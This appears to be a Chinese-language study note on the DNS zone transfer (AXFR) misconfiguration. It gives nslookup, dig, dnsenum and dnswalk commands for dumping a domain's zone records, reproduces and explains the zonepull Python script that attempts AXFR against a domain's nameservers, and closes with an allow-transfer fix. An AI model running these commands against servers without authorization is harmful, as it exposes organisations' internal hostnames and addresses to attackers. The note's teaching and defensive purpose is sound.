<h1 id="x00-">0x00 前言</h1>

<hr />

<p>本文是关于DNS域传送漏洞的学习与总结。</p>

<p>在<a href="http://www.hackcto.com/post/2013-01-15/40047740289">《安全参考》</a>第一期中有：区域传送操作指的是一台后备服务器使用来自主服务器的数据刷新自己的 zone 数据库。这为运行中的 DNS 服务提供了一定的冗余度,其目的是为了防止主域名服务器因意外故障变得不可用时影响到全局。一般来说,DNS区域传送操作只在网络里真的有后备域名 DNS 服务器时才有必要执行,但许多 DNS 服务器却被错误地配置成<strong>只要有人发出请求</strong>,就会向对方提供一个 zone 数据库的<strong>拷贝</strong>。如果所提供的信息只是与连到因特网上且具备有效主机名的系统相关,那么这种错误配置不一定是坏事,尽管这使得攻击者发现潜在目标要容易得多。真正的问题发生在一个单位没有使用公用/私用 DNS 机制来分割外部公用 DNS 信息和内部私用 DNS 信息的时候,此时内部主机名和 IP 地址都暴露给了攻击者。把内部 IP 地址信息提供给因特网上不受信任的用户,就像是把一个单位的内部网络完整蓝图或导航图奉送给了别人。对系统管理员来说,允许不受信任的因特网用户执行 DNS 区域传送(<code>zone transfer</code>)操作是后果最为严重的错误配置之一。</p>

<p>同时，在<a href="http://wiki.wooyun.org/information:domain">WooYun WiKi</a>中也说道，利用DNS域传送漏洞可以有效地收集相关企业的子域名，收集信息也是渗透过程中很关键的一步。</p>

<h1 id="x02-">0x02 攻击方法</h1>

<hr />

<h2 id="windowsnslookup">Windows下使用nslookup</h2>

<ol>
  <li>
    <p>先设置查找类型为NS，查找出对应主机域的域名服务器。（或直接键入nslookup进入交互模式，再通过<code>set type=ns</code>进行设置）</p>

    <p><code>C:\&gt;nslookup -qa=ns test.com</code></p>

    <p>会返回类似结果：</p>

    <pre><code>    Server:  bogon
    Address:  172.16.162.2           

    Non-authoritative answer:
    test.com        nameserver = ns66.worldnic.com
    test.com        nameserver = ns65.worldnic.com
</code></pre>
  </li>
  <li>
    <p>使用nslookup命令进入交互模式，更改默认服务器为刚才查询的域名服务器</p>

    <p><code>&gt; server=ns66.worldnic.com</code></p>
  </li>
  <li>
    <p>列出服务器上所有的DNS记录</p>

    <p><code>&gt; ls -d test.com</code></p>
  </li>
  <li>
    <p>nslookup命令参考：</p>

    <ul>
      <li><a href="http://roclinux.cn/?p=2441">《nslookup通往DNS的桥梁》-linux命令五分钟系列之三十三</a></li>
      <li>nslookup进入交互模式后查看帮助：<code>&gt;help</code></li>
    </ul>
  </li>
</ol>

<h2 id="kalidig-dnsenum-dnswalk">Kali下使用dig, dnsenum, dnswalk</h2>

<ul>
  <li>
    <p>使用<code>dig</code>命令进行全量传输<a href="http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html">AXFR</a>（从域名服务器从主域名服务器上请求zone文件）</p>

    <pre><code>  dig @dnsserver name querytype
  dig @192.168.5.6 test.com axfr
</code></pre>
  </li>
  <li>
    <p>使用<code>dnsenum</code>获取测试对象全部的 DNS 解析记录信息</p>

    <pre><code>  ./dnsenum.pl –enum test.com
</code></pre>
  </li>
  <li>
    <p>使用<code>dnswalk</code>获取测试对象全部的 DNS 解析记录信息，注意域名后有一个点</p>

    <pre><code>  ./dnswalk test.com.
</code></pre>
  </li>
  <li>
    <p>相关命令参考：</p>

    <ul>
      <li><a href="http://www.hackcto.com/post/2013-01-15/40047740289">《安全参考》第一期</a></li>
      <li><a href="http://drops.wooyun.org/papers/64">DNS域传送信息泄露</a></li>
      <li><a href="http://roclinux.cn/?p=2449">《dig挖出DNS的秘密》-linux命令五分钟系列之三十四</a></li>
    </ul>
  </li>
</ul>

<h1 id="x03-python">0x03 攻击Python脚本分析</h1>

<hr />

<p>一看Github上有，就拿来分析一下吧，<a href="https://github.com/kaizoku/zonepull/blob/master/zonepull/zonepull.py">kaizoku/zonepull</a></p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
<span class="c">### Zonepuller</span>
<span class="c">## Attempts to get a domain transfer from the nameservers for the given domain</span>
<span class="c">## Requires dnspython http://www.dnspython.org/    import sys</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">optparse</span>
<span class="k">try</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">dns</span> <span class="kn">import</span> <span class="n">resolver</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">exception</span>
<span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">&quot;This script requires dnspython&quot;</span>
    <span class="k">print</span> <span class="s">&quot;http://www.dnspython.org/&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>    

<span class="k">class</span> <span class="nc">Transferrer</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">domain</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">domain</span> <span class="o">=</span> <span class="n">domain</span>
        <span class="c">## build list of nameservers</span>
        <span class="n">nss</span> <span class="o">=</span> <span class="n">resolver</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="s">&#39;NS&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">nameservers</span> <span class="o">=</span> <span class="p">[</span> <span class="nb">str</span><span class="p">(</span><span class="n">ns</span><span class="p">)</span> <span class="k">for</span> <span class="n">ns</span> <span class="ow">in</span> <span class="n">nss</span> <span class="p">]</span>    
    <span class="k">def</span> <span class="nf">transfer</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">ns</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">nameservers</span><span class="p">:</span>
            <span class="k">print</span> <span class="o">&gt;&gt;</span> <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Querying </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">ns</span><span class="p">,)</span>
            <span class="k">print</span> <span class="o">&gt;&gt;</span> <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">50</span>
            <span class="n">z</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">ns</span><span class="p">)</span>
            <span class="k">print</span> <span class="n">z</span>
            <span class="k">print</span> <span class="o">&gt;&gt;</span> <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="si">%s</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="s">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">,)</span>    
    <span class="k">def</span> <span class="nf">query</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ns</span><span class="p">):</span>
        <span class="n">nsaddr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">resolve_a</span><span class="p">(</span><span class="n">ns</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">z</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pull_zone</span><span class="p">(</span><span class="n">nsaddr</span><span class="p">)</span>
        <span class="k">except</span> <span class="p">(</span><span class="n">exception</span><span class="o">.</span><span class="n">FormError</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">,</span> <span class="ne">EOFError</span><span class="p">):</span>
            <span class="k">print</span> <span class="o">&gt;&gt;</span> <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;AXFR failed</span><span class="se">\n</span><span class="s">&quot;</span>
            <span class="k">return</span> <span class="bp">None</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">z</span>    
    <span class="k">def</span> <span class="nf">resolve_a</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="sd">&quot;&quot;&quot;Pulls down an A record for a name&quot;&quot;&quot;</span>
        <span class="n">nsres</span> <span class="o">=</span> <span class="n">resolver</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#39;A&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">nsres</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>    
    <span class="k">def</span> <span class="nf">pull_zone</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">nameserver</span><span class="p">):</span>
        <span class="sd">&quot;&quot;&quot;Sends the domain transfer request&quot;&quot;&quot;</span>
        <span class="n">q</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">xfr</span><span class="p">(</span><span class="n">nameserver</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">domain</span><span class="p">,</span> <span class="n">relativize</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">zone</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>   <span class="c">## janky, but this library returns</span>
        <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">q</span><span class="p">:</span> <span class="c">## an empty generator on timeout</span>
            <span class="n">zone</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">zone</span><span class="p">:</span>
            <span class="k">raise</span> <span class="ne">EOFError</span>
        <span class="k">return</span> <span class="n">zone</span>    
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">optparse</span><span class="o">.</span><span class="n">OptionParser</span><span class="p">(</span><span class="n">usage</span><span class="o">=</span><span class="s">&quot;%prog &lt;domain&gt;&quot;</span><span class="p">,</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;%prog 0.1&quot;</span><span class="p">)</span>
    <span class="n">options</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="p">:</span>
        <span class="n">parser</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s">&quot;Must include at least one domain to transfer&quot;</span><span class="p">)</span>        <span class="k">for</span> <span class="n">dom</span> <span class="ow">in</span> <span class="n">args</span><span class="p">:</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">Transferrer</span><span class="p">(</span><span class="n">dom</span><span class="p">)</span>
        <span class="n">t</span><span class="o">.</span><span class="n">transfer</span><span class="p">()</span></code></pre></div>

<h3 id="section">分析：</h3>

<ul>
  <li>程序先尝试导入dns，没有安装dnspython则退出</li>
  <li>定义Transferrer()类来完成主要的域传送检测，先使用<code>resolver.query(domain, 'NS')</code>方法查询对应域名的NS记录，并将其作为域名服务器查询其A记录，最后使用<code>query.xfr(nameserver, self.domain, relativize=False, timeout=2)</code>尝试进行域传送</li>
  <li>main()函数主要对命令行传入的域名进行单线程串行检测是否存在DNS域传送</li>
</ul>

<h3 id="tips">Tips：</h3>

<ul>
  <li><code>print &gt;&gt; sys.stderr, "Message"</code>可将信息重定向输出到标准错误输出当中</li>
  <li><code>parser.error("Message")</code>可用于选项解析错误提示</li>
</ul>

<h1 id="x04-">0x04 防御方法</h1>

<hr />

<p>在相应的zone、options中添加allow-transfer限制，具体见<a href="http://wiki.wooyun.org/doku.php?id=server:zone-transfer">DNS 域传送漏洞</a>。这里还存在的<strong>问题</strong>是：未对DNS服务和DNS服务器深入了解，攻击也没有重现，还有待深入学习，而且DNS的问题也不止这些，<a href="http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html">推荐看看</a></p>

